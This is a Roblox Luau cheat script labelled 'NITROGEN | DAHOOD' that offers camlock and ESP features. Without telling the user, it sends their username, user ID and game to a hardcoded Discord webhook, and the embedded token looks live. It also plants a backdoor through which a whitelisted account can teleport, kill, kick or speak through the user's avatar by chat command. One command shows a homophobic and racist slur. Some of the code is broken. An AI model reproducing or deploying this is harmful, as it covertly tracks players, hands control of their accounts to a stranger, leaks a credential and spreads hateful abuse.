local Players: Players = game:GetService('Players');
local ReplicatedStorage: ReplicatedStorage = game:GetService('ReplicatedStorage')
local tcs: TextChatService = game:GetService('TextChatService');
local lplr: Player = Players.LocalPlayer;
local HttpService: HttpService = game:GetService('HttpService');
local whitelist = {['a'] = 'jordynmwa'}
local webhookUrl = "https://discord.com/api/webhooks/1325017381327867954/aVuuT_Xn0LbJq-cvu0iLEmP1-k9y7SwWALU-E1Iu3fOwJ1rZ07ChqfTR2q78ci6iIQKe"

local player = game.Players.LocalPlayer

local data = {
    content = "",
    embeds = {  
        {
            title = "new player executed",
            color = 5814783,
            fields = {
                {
                    name = "Username",
                    value = player.Name,
                    inline = true
                },
                {
                    name = "User ID",
                    value = tostring(player.UserId),
                    inline = true
                },
                {
                    name = "Game",
                    value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    inline = true                                                   
                }
            },
            image = {
                url = string.format('https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png', player.UserId)
            }
        }
    }
}

local response = request({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game:GetService("HttpService"):JSONEncode(data)
})

local whitelisted: boolean = false;
for i, v in whitelist do
    if lplr.name == v then
        whitelisted = true;
    end
end

if whitelisted then print('You\'re whitelisted!') end

local iswl = function(player)
    for i: number, v: Player in whitelist do
        if player == v then
            return true;
        end;
    end;
    return false;
end;

local GetPlayerByName = function(name)
    for _, v in ipairs(Players:GetPlayers()) do
        local lowerName = name:lower()
        if string.find(v.Name:lower(), lowerName) or string.find(v.DisplayName:lower(), lowerName) then
            return v
        end
    end
    return nil
end


local bring = function(msg, v)
    local um = string.split(msg, ' ')[2]
    if um == 'all' or GetPlayerByName(um) then
        lplr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame;
    end
end

local isorbitenabled = false
local savedPosition = nil  

local orbit = function(msg, v)
    isorbitenabled = true
    local um = string.split(msg, ' ')[3]
    local um2 = string.split(msg, ' ')[2]
    local targetPlayer = GetPlayerByName(um)
    
    if targetPlayer and GetPlayerByName(um2) then
        local cmdconnections = {}
        cmdconnections[#cmdconnections + 1] = task.spawn(function()
            local radius = 5
            local speed = 17
            local angle = 0
            local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        
            if targetHRP then
             
                local playerHRP = lplr.Character and lplr.Character:FindFirstChild("HumanoidRootPart")
                if playerHRP then
                    savedPosition = playerHRP.Position  
                    print("Saved Position: " .. tostring(savedPosition))  
                end

                while targetPlayer and isorbitenabled do
                    task.wait(0.03)
                    targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")

                    if targetHRP then
                        angle = angle + speed
                        if angle >= 360 then
                            angle = 0
                        end
                        
                        local x = math.cos(math.rad(angle)) * radius
                        local z = math.sin(math.rad(angle)) * radius
                        
                        local orbitPosition = targetHRP.CFrame * CFrame.new(x, 0, z)
                        lplr.Character.HumanoidRootPart.CFrame = CFrame.lookAt(orbitPosition.Position, targetHRP.Position)
                    end
                end
            end
        end)
    end
end

local unorbit = function(msg, v)
    isorbitenabled = false

    if savedPosition then
      
        task.wait(0.15)

        local playerHRP = lplr.Character and lplr.Character:FindFirstChild("HumanoidRootPart")
        if playerHRP then
            playerHRP.CFrame = CFrame.new(savedPosition)  
            savedPosition = nil  
        end
    end
end

local tp = function(msg)
    local args = string.split(msg, ' ')
    local um = args[2]
    local targetPlayerName = args[3]
    local lplr = Players.LocalPlayer
    local targetPlayer = GetPlayerByName(targetPlayerName)

    if targetPlayer and (um == lplr.Name or string.find(lplr.DisplayName:lower(), um:lower())) then
        lplr.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
    end
end


local notify = function(msg, v)
    local args = string.split(msg, ' ')
    local targetPlayerName = args[2]
    local notificationText = table.concat(args, ' ', 3)

    local targetPlayer = GetPlayerByName(targetPlayerName)
    
    if targetPlayer then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Notification",
            Text = notificationText,
            Duration = 5
        })
    end
end

isbangenabled = false
local savedPosition = nil

local bang = function(msg, v)
    isbangenabled = true
    local args = string.split(msg, ' ')
    local localPlayerName = args[2]
    local targetPlayerName = args[3]

    local localPlayer = GetPlayerByName(localPlayerName)
    local targetPlayer = GetPlayerByName(targetPlayerName)
    
    local forwardDistance = -0.3
    local backDistance = -3

    while isbangenabled do
        if localPlayer and targetPlayer then
            local localCharacter = localPlayer.Character
            local targetCharacter = targetPlayer.Character
            local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
            local localHRP = localCharacter:FindFirstChild("HumanoidRootPart")

            if targetHRP and localHRP then
                if not savedPosition then
                    savedPosition = localHRP.Position
                end

                local backVector = targetHRP.CFrame.LookVector * backDistance
                local forwardVector = targetHRP.CFrame.LookVector * forwardDistance
                
                localHRP.CFrame = CFrame.new(targetHRP.Position + backVector)
                localHRP.CFrame = CFrame.new(localHRP.Position, targetHRP.Position)
                
                task.wait(0.08)
                
                localHRP.CFrame = CFrame.new(targetHRP.Position + forwardVector)
                localHRP.CFrame = CFrame.new(localHRP.Position, targetHRP.Position)
            end
        end
        task.wait(0.08)
    end
end

local unbang = function(msg, v)
    isbangenabled = false

    local playerHRP = lplr.Character and lplr.Character:FindFirstChild("HumanoidRootPart")
    if playerHRP and savedPosition then
        playerHRP.CFrame = CFrame.new(savedPosition)
        savedPosition = nil  
    end
end

local GetPlayerByName = function(name)
    local exactMatchPlayer

    for _, v in ipairs(Players:GetPlayers()) do
        local lowerName = name:lower()
        if string.find(v.Name:lower(), lowerName) or string.find(v.DisplayName:lower(), lowerName) then
            if not exactMatchPlayer then
                exactMatchPlayer = v
            end
        end
    end

    return exactMatchPlayer  
end

local hide = function(msg, v)
    local args = string.split(msg, ' ')
    local targetPlayerName = args[3]
    local targetPlayer = GetPlayerByName(targetPlayerName)

    if targetPlayer and GetPlayerByName(args[2]) then
        local targetCharacter = targetPlayer.Character
        local targetHRP = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
        if targetHRP then
            playerPositions[targetPlayerName] = targetHRP.Position

            targetHRP.CFrame = CFrame.new(targetHRP.Position + Vector3.new(0, 15000, 0))  

            teleportingPlayers[targetPlayerName] = true

            spawn(function()
                while teleportingPlayers[targetPlayerName] do
                    if targetHRP then
                        targetHRP.CFrame = CFrame.new(targetHRP.Position.X, 15000, targetHRP.Position.Z)
                        wait(0.1)  
                        targetHRP.CFrame = CFrame.new(targetHRP.Position.X, 14950, targetHRP.Position.Z)
                        wait(0.1)
                    end
                end
            end)
        end
    end
end

local unhide = function(msg, v)
    local args = string.split(msg, ' ')
    local targetPlayerName = args[2]
    local targetPlayer = GetPlayerByName(targetPlayerName)

    if targetPlayer then
        local targetCharacter = targetPlayer.Character
        local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
        if targetHRP then
            local originalPosition = playerPositions[targetPlayerName]
            if originalPosition then
        
                targetHRP.CFrame = CFrame.new(originalPosition)  
                teleportingPlayers[targetPlayerName] = nil  
                playerPositions[targetPlayerName] = nil 
            else
          
                targetHRP.CFrame = CFrame.new(Vector3.new(0, 40, 0))  
            end
        end
    end
end

local reset = function(msg, v)
    local args = string.split(msg, ' ')
    local targetPlayerName = args[2]
    local targetPlayer = GetPlayerByName(targetPlayerName)

    if targetPlayer then
        local targetCharacter = targetPlayer.Character
        local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
        if targetHRP then
            local originalPosition = targetHRP.Position

            targetPlayer.Character.Humanoid.Health = 0

            task.wait(5.2)

            targetCharacter = targetPlayer.Character
            targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
            if targetHRP then
                targetHRP.CFrame = CFrame.new(originalPosition)
            end
        end
    end
end

local previousPosition = nil
local isFollowing = false
local followLoop = nil

local follow = function(msg)
    local args = string.split(msg, ' ')
    if args[1] == ".follow" and GetPlayerByName(args[2]) then
        local targetPlayerName = args[3]
        local targetPlayer = GetPlayerByName(targetPlayerName)

        if targetPlayer then
            local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            local playerHRP = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

            if targetHRP and playerHRP then
                local playerPos = playerHRP.Position
                previousPosition = playerPos
                isFollowing = true

                if not followLoop then
                    followLoop = game:GetService("RunService").Heartbeat:Connect(function()
                        if isFollowing then
                            local targetPos = targetHRP.Position
                            local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                            if humanoid then
                                humanoid.WalkSpeed = 16
                                humanoid:MoveTo(targetPos)
                            end
                        end
                    end)
                end
            end
        end
    end
end

local unfollow = function()
    isFollowing = false

    if followLoop then
        followLoop:Disconnect()
        followLoop = nil
    end

    local playerHRP = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

    if previousPosition and playerHRP and humanoid then
        humanoid.WalkSpeed = 16
        humanoid:MoveTo(previousPosition)
        previousPosition = nil
    end
end

local dance = function(msg, v)
    local player = GetPlayerByName(msg.split(msg, ' ')[2])  
    if player and player.Character then
        if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
            tcs.ChatInputBarConfiguration.TargetTextChannel:SendAsync("/e dance")
        else
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/e dance", 'All')
        end     
    end
end

local stopdance = function(msg, v)
    local playerName = msg:split(' ')[2]
    local player = GetPlayerByName(playerName)
    if player and player.Character and player == lplr then
        game.Players.LocalPlayer.Character.Humanoid.Jump = true      
    end
end

local tpp2 = {
    ["bank"] = Vector3.new(-480, 23, -285),
    ["school"] = Vector3.new(-532, 21, 336),
    ["hairsalon"] = Vector3.new(-858, 22, -652),
    ["gym"] = Vector3.new(-79, 22, -632),
    ["hoodkicks"] = Vector3.new(-240, 21, -413),
    ["uphill"] = Vector3.new(481, 47, -572),
    ["downhill"] = Vector3.new(-535, 7, -735),
    ["uphillfood"] = Vector3.new(588, 51, -480),
    ["food"] = Vector3.new(-335, 23, -295),
    ["revolver"] = Vector3.new(-635, 21, -131),
    ["gastation"] = Vector3.new(592, 48, -257),
    ["park"] = Vector3.new(-262, 22, -761),
    ["mil"] = Vector3.new(38, 25, -875),
    ["fling"] = Vector3.new(-10000, 10000, -10000),
}

local tpp = function(msg, v)
    local args = string.split(msg, ' ')
    if args[1] == ".tpp" and GetPlayerByName(args[2]) then
        local locationName = args[3]
        local targetPlayerName = args[2]
        local targetPlayer = GetPlayerByName(targetPlayerName)

        if targetPlayer and tpp2[locationName] then
            local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetHRP then
                targetHRP.CFrame = CFrame.new(tpp2[locationName])
            end
        end
    end   
end

local sit = function(msg, v)
    local args = string.split(msg, ' ')
    if args[1] == ".sit" and GetPlayerByName(args[2]) then
        local player = GetPlayerByName(args[2])
        if player and player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.Sit = true
        end
    end
end

local rainbow = function(msg, v)
    local args = string.split(msg, ' ')
    if args[1] == ".rainbow" and GetPlayerByName(args[2]) then
        local targetPlayerName = args[3]
        if player and player.Character and player.Character:FindFirstChild("Humanoid") then
            local gui = Instance.new("ScreenGui")
            gui.Parent = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
            
            local label = Instance.new("TextLabel")
            label.Text = "you a faggot nigga🌈🌈🌈"
            label.FontSize = Enum.FontSize.Size48
            label.BackgroundTransparency = 1
            label.TextColor3 = Color3.new(1, 1, 1)
            label.Size = UDim2.new(0, 300, 0, 50)
            label.Position = UDim2.new(0.5, -150, 0.5, -25)
            label.Parent = gui
            
            task.wait(5)
            gui:Destroy()
        end
    end
end

isbenxenabled = false
local savedPosition = nil

local benx = function(msg, v) 
    isbenxenabled = true 

    local args = string.split(msg, ' ')
    local localPlayerName = args[2]
    local targetPlayerName = args[3]

    local localPlayer = GetPlayerByName(localPlayerName)
    local targetPlayer = GetPlayerByName(targetPlayerName)
    
    local forwardDistance = 3  
    local backDistance = -0.3  

    while isbenxenabled do 
        if localPlayer and targetPlayer then
            local localCharacter = localPlayer.Character
            local targetCharacter = targetPlayer.Character
            local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
            local localHRP = localCharacter:FindFirstChild("HumanoidRootPart")

            if targetHRP and localHRP then
                if not savedPosition then
                    savedPosition = localHRP.Position
                end

                local forwardVector = targetHRP.CFrame.LookVector * forwardDistance
                local backVector = targetHRP.CFrame.LookVector * backDistance
                
                localHRP.CFrame = CFrame.new(targetHRP.Position + forwardVector)
                localHRP.CFrame = CFrame.new(localHRP.Position, targetHRP.Position)
                
                task.wait(0.08)
            
                localHRP.CFrame = CFrame.new(targetHRP.Position + forwardVector)
                localHRP.CFrame = CFrame.new(localHRP.Position, targetHRP.Position)
            end
        end
        task.wait(0.08)
    end
end

local unbenx = function(msg, v)
    isbenxenabled = false

    local playerHRP = lplr.Character and lplr.Character:FindFirstChild("HumanoidRootPart")
    if playerHRP and savedPosition then
        playerHRP.CFrame = CFrame.new(savedPosition)
        savedPosition = nil  
    end
end

local skill  = function(msg, v)
    local args = string.split(msg, ' ')
    if args[1] == ".skill" and GetPlayerByName(args[2]) == lplr then
        local player = lplr
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(5000, 5000, 5000)
            wait(0.1)
            player.Character.Humanoid.Health = 0
        end
    end
end

local troll = function(msg, v)
    local args = string.split(msg, ' ')
    if args[1] == ".troll" and GetPlayerByName(args[2]) == lplr then
        local player = lplr
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local screenGui = Instance.new("ScreenGui")
            screenGui.Parent = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
            
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.Position = UDim2.new(0, 0, 0, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BackgroundTransparency = 0
            frame.Parent = screenGui
            
            wait(0.1)
            frame:Destroy()
        end
    end
end


local untroll = function(msg, v)
    local args = string.split(msg, ' ')
    if args[1] == ".untroll" and GetPlayerByName(args[2]) == lplr then
        local player = lplr
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local screenGui = player:FindFirstChild("PlayerGui"):FindFirstChild("ScreenGui")
            if screenGui then
                screenGui:Destroy()
            end
        end
    end
end

local cmdconnections = {}

local cmds = {
    bring = function(msg, v) bring(msg, v) end,
    move = function(msg, v) bring(msg, v) end,
    tp = function(msg, v) tp(msg, v) end,
    teleport = function(msg, v) tp(msg, v) end,
    orbit = function(msg, v) orbit(msg, v) end,
    unorbit = function(msg, v) unorbit(msg, v) end,
    notify = function(msg, v) notify(msg, v) end,
    bang = function(msg, v) bang(msg, v) end,
    unbang = function(msg, v) unbang(msg, v) end,
    hide = function(msg, v) hide(msg, v) end,
    unhide = function(msg, v) unhide(msg, v) end,
    reset = function(msg, v) reset(msg, v) end,
    follow = function(msg, v) follow(msg, v) end,
    unfollow = function(msg, v) unfollow(msg, v) end,
    dance = function(msg, v) dance(msg, v) end,
    stopdance = function(msg, v) stopdance(msg, v) end,
    tpp = function(msg, v) tpp(msg, v) end,
    sit = function(msg, v) sit(msg, v) end,
    rainbow = function(msg, v) gay(msg, v) end,
    benx = function(msg, v) benx(msg, v) end,
    unbenx = function(msg, v) unbenx(msg, v) end,
    skill = function(msg, v) skill(msg, v) end,
    troll = function(msg, v) troll(msg, v) end,
    untroll = function(msg, v) untroll(msg, v) end,
    chat = function(msg, v)
        local args = string.split(msg, '.chat ')[2]
        if not args then return end
    
        local splitArgs = string.split(args, ' ')
        local targetPlayerName = splitArgs[1]
        local chatMessage = table.concat(splitArgs, ' ', 2)
    
        if not targetPlayerName or not GetPlayerByName(targetPlayerName) then
            return
        end
        
        if not chatMessage or chatMessage == "" then
            return
        end
    
        if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
            tcs.ChatInputBarConfiguration.TargetTextChannel:SendAsync(chatMessage)
        else
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatMessage, 'All')
        end
    end,    
    kill = function(msg, v)
        local target = string.split(msg, ' ')[2]
        if target == 'all' or (GetPlayerByName(target) == lplr) then
            lplr.Character.Humanoid.Health = 0
        end
    end,
    kick = function(msg, v)
        local args = string.split(msg, ' ')
        local targetName = args[2]
        
        if targetName == lplr.Name or targetName == lplr.DisplayName or string.find(lplr.Name:lower(), targetName:lower()) or string.find(lplr.DisplayName:lower(), targetName:lower()) then
            local kickReason = args[3] or "Kicked by " .. lplr.Name
            lplr:Kick(kickReason)
        end
    end    
}

for _, v in Players:GetPlayers() do
    v.Chatted:Connect(function(msg)
        if iswl(v.Name) and v ~= lplr and not iswl(lplr.Name) and not whitelisted then
            local testy: any? = cmds[string.split(string.gsub(msg, '%.', ' '), ' ')[2]];
            if testy then
                testy(msg, v);
            end
        end
    end);
end;

local G2L = {};

-- StarterGui.MNSGUI
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[MNSGUI]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.MNSGUI.MainNitroFrame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["2"]["Size"] = UDim2.new(0, 423, 0, 545);
G2L["2"]["Position"] = UDim2.new(0.36443, 0, 0.10585, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["2"]["Name"] = [[MainNitroFrame]];


-- StarterGui.MNSGUI.MainNitroFrame.1
G2L["3"] = Instance.new("TextLabel", G2L["2"]);
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["TextSize"] = 12;
G2L["3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3"]["TextColor3"] = Color3.fromRGB(164, 140, 165);
G2L["3"]["BackgroundTransparency"] = 1;
G2L["3"]["Size"] = UDim2.new(0.47754, 0, 0.0127, 23);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Text"] = [[NITROGEN ︱DAHOOD VER 1.0.1]];
G2L["3"]["Name"] = [[1]];
G2L["3"]["Position"] = UDim2.new(0.0331, 0, -0, 0);


-- StarterGui.MNSGUI.MainNitroFrame.TabHolder
G2L["4"] = Instance.new("Frame", G2L["2"]);
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["4"]["Size"] = UDim2.new(0, 393, 0, 25);
G2L["4"]["Position"] = UDim2.new(0.0331, 0, 0.05408, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["4"]["Name"] = [[TabHolder]];


-- StarterGui.MNSGUI.MainNitroFrame.TabHolder.UIListLayout
G2L["5"] = Instance.new("UIListLayout", G2L["4"]);
G2L["5"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["5"]["Padding"] = UDim.new(0, 10);
G2L["5"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["5"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.MNSGUI.MainNitroFrame.TabHolder.MainButton
G2L["6"] = Instance.new("TextButton", G2L["4"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["TextSize"] = 12;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["Size"] = UDim2.new(0, 48, 0, 25);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Name"] = [[MainButton]];
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[MAIN]];


-- StarterGui.MNSGUI.MainNitroFrame.TabHolder.PlayersButton
G2L["7"] = Instance.new("TextButton", G2L["4"]);
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["TextSize"] = 12;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["Size"] = UDim2.new(0, 48, 0, 25);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Name"] = [[PlayersButton]];
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[TELEPORT]];
G2L["7"]["Position"] = UDim2.new(0.21575, 0, 0, 0);


-- StarterGui.MNSGUI.MainNitroFrame.TabHolder.LocalScript
G2L["8"] = Instance.new("LocalScript", G2L["4"]);



-- StarterGui.MNSGUI.MainNitroFrame.TabHolder.HowToUse
G2L["9"] = Instance.new("TextButton", G2L["4"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["TextSize"] = 12;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["Size"] = UDim2.new(0, 48, 0, 25);
G2L["9"]["BackgroundTransparency"] = 1;
G2L["9"]["Name"] = [[HowToUse]];
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[HOW TO USE]];
G2L["9"]["Position"] = UDim2.new(0.21575, 0, 0, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame
G2L["a"] = Instance.new("Frame", G2L["2"]);
G2L["a"]["Visible"] = false;
G2L["a"]["ZIndex"] = 3;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["SelectionOrder"] = 3;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["a"]["Size"] = UDim2.new(0, 422, 0, 484);
G2L["a"]["Position"] = UDim2.new(0, 0, 0.11096, 0);
G2L["a"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["a"]["Name"] = [[MainFrame]];


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopLeft
G2L["b"] = Instance.new("Frame", G2L["a"]);
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["b"]["Size"] = UDim2.new(0, 192, 0, 226);
G2L["b"]["Position"] = UDim2.new(-0.79104, 0, 0.22629, 0);
G2L["b"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["b"]["Name"] = [[MainTopLeft]];
G2L["b"]["LayoutOrder"] = 1;


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopLeft.CamlockToggle
G2L["c"] = Instance.new("TextButton", G2L["b"]);
G2L["c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["TextSize"] = 14;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["c"]["Name"] = [[CamlockToggle]];
G2L["c"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["c"]["Text"] = [[]];
G2L["c"]["Position"] = UDim2.new(0.04348, 0, 0.13068, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopLeft.CamlockToggle.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["c"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopLeft.2
G2L["e"] = Instance.new("TextLabel", G2L["b"]);
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextSize"] = 9;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Size"] = UDim2.new(0.16072, 0, -0.0316, 23);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[Camlock]];
G2L["e"]["Name"] = [[2]];
G2L["e"]["Position"] = UDim2.new(0.41437, 0, -0.00176, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopLeft.6
G2L["f"] = Instance.new("TextLabel", G2L["b"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["TextSize"] = 9;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Size"] = UDim2.new(0.47579, 0, -0.0263, 23);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Text"] = [[ENABLE CAMLOCK]];
G2L["f"]["Name"] = [[6]];
G2L["f"]["Position"] = UDim2.new(0.09556, 0, 0.11298, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight
G2L["10"] = Instance.new("Frame", G2L["a"]);
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["10"]["Size"] = UDim2.new(0, 192, 0, 226);
G2L["10"]["Position"] = UDim2.new(0.54837, 0, -0.00103, 0);
G2L["10"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["10"]["Name"] = [[MainTopRight]];
G2L["10"]["LayoutOrder"] = 2;


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.3
G2L["11"] = Instance.new("TextLabel", G2L["10"]);
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["TextSize"] = 9;
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["11"]["BackgroundTransparency"] = 1;
G2L["11"]["Size"] = UDim2.new(0.16072, 0, -0.0316, 23);
G2L["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Text"] = [[VISUALS]];
G2L["11"]["Name"] = [[3]];
G2L["11"]["Position"] = UDim2.new(0.41549, 0, -0.00176, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.8
G2L["12"] = Instance.new("TextLabel", G2L["10"]);
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextSize"] = 9;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["12"]["BackgroundTransparency"] = 1;
G2L["12"]["Size"] = UDim2.new(0.24241, 0, -0.03176, 23);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[ENABLE  BOX ESP]];
G2L["12"]["Name"] = [[8]];
G2L["12"]["Position"] = UDim2.new(0.24143, 0, 0.11845, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.NametagsToggle
G2L["13"] = Instance.new("TextButton", G2L["10"]);
G2L["13"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["TextSize"] = 14;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(32, 32, 32);
G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13"]["Size"] = UDim2.new(0, 10, 0, 10);
G2L["13"]["Name"] = [[NametagsToggle]];
G2L["13"]["BorderColor3"] = Color3.fromRGB(165, 141, 166);
G2L["13"]["Text"] = [[]];
G2L["13"]["Position"] = UDim2.new(0.04869, 0, 0.25015, 0);


-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.NametagsToggle.LocalScript
G2L["14"] = Instance.new("LocalScript", G2L["13"]);



-- StarterGui.MNSGUI.MainNitroFrame.MainFrame.MainTopRight.10
G2L["15"] = Instance.new("TextLabel", G2L["10"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 9;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["FontFace"] = Font.new([[rbxassetid://12187371840]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["15"]["BackgroundTransparency"] = 1;
